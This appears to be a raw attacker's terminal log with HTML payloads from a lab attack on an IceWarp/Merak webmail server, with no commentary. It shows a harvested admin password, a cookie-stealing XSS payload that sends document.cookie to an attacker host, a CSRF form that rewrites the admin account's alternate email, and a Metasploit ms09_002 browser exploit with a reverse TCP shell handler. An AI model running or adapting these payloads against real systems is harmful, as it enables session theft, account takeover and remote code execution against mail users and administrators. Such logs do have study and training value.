root@kali:~# nc -nv 192.168.102.182 25
(UNKNOWN) [192.168.102.182] 25 (smtp) open
220 mail ESMTP Merak 8.9.1; Tue, 14 Jan 2020 07:59:17 -0500



root@kali:~# tail -f /var/log/apache2/access.log




root@kali:~# python -m smtpd -n -c DebuggingServer 192.168.102.21:25
---------- MESSAGE FOLLOWS ----------
Received: from localhost ([127.0.0.1])
        by mail (Merak 8.9.1) with SMTP id GPS51109;
        Tue, 14 Jan 2020 09:04:09 -0500
Date: Tue, 14 Jan 2020 09:04:09 -0500
From: Admin <admin@victim.com>
To: haha@192.168.102.21
Subject: Forgotten password for admin
Message-ID: <75bd40072c5d01e29360fa363835abdb@victim.com>
X-Mailer: IceWarp Web Mail 5.6.7
X-Originating-IP: 192.168.102.21
X-Peer: 192.168.102.182

Your account: "admin@victim.com" has password "admin".
------------ END MESSAGE ------------





root@kali:~# sendEmail -t admin@victim.com -f attacker@victim.com -s 192.168.102.182 -u "Emergency" -o message-file=a.txt tls=no
Jan 14 22:03:28 kali sendEmail[7574]: Email was sent successfully!




html>
<body onload='document.location.replace("http://192.168.102.21/seren.asp?name=unknown&cookies=" +document.cookie + "&URL=" +document.location);'>
</body>
</html>






<html>
</form>
<form method=POST name="frm1"  action="/mail/accountsettings_add.html">
<input type="hidden" name="id" value="x">
<input type="hidden" name="accountid" value="0" >
<input type="hidden" name="Save_x" value="1">
<input type="hidden" name="action" value="mod">
<input type="hidden" name="account[USER]=" value="victim.com/admin">
<input type="hidden" name="account[EMAIL]" value="admin@victim.com">
<input type="hidden" name="account[PASS]" value="*****">
<input type="hidden" name="account[PASS2]" value="*****">
<input type="hidden" name="account[FULLNAME]" value="Admin">
<input type="hidden" name="account[ALTEMAIL]" value="haha@192.168.102.21">
<input type="hidden" name="account[HOSTUSER]" value="victim.com/evil">
<input type="hidden" name="account[COLOR]" value="">
<input type="hidden" name="Save_x" value="Save+Changes">
</form>
<body onload='document.frm1.id.value = document.main.id.value; document.frm1.submit(); '>
</html>





<html>
<body onload='document.location.replace("http://192.168.102.21:80/Q6fIQP3U");'>
</body>
</html>






msf > use exploit/windows/browser/ms09_002_memory_corruption 
msf exploit(windows/browser/ms09_002_memory_corruption) > set srvhost 192.168.102.21
srvhost => 192.168.102.21
msf exploit(windows/browser/ms09_002_memory_corruption) > set srvport 80
srvport => 80
msf exploit(windows/browser/ms09_002_memory_corruption) > unset InitialAutoRunScript
Unsetting InitialAutoRunScript...
msf exploit(windows/browser/ms09_002_memory_corruption) > exploit
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.11.194:4444 
[*] Using URL: http://192.168.102.21:80/6LOURv8u
[*] Server started.
msf exploit(windows/browser/ms09_002_memory_corruption) > Interrupt: use the 'exit' command to quit
msf exploit(windows/browser/ms09_002_memory_corruption) > set lhost 192.168.102.21
lhost => 192.168.102.21
msf exploit(windows/browser/ms09_002_memory_corruption) > exploit
[*] Exploit running as background job 1.

[*] Started reverse TCP handler on 192.168.102.21:4444 
[*] Using URL: http://192.168.102.21:80/Q6fIQP3U
[*] Server started.
msf exploit(windows/browser/ms09_002_memory_corruption) > 

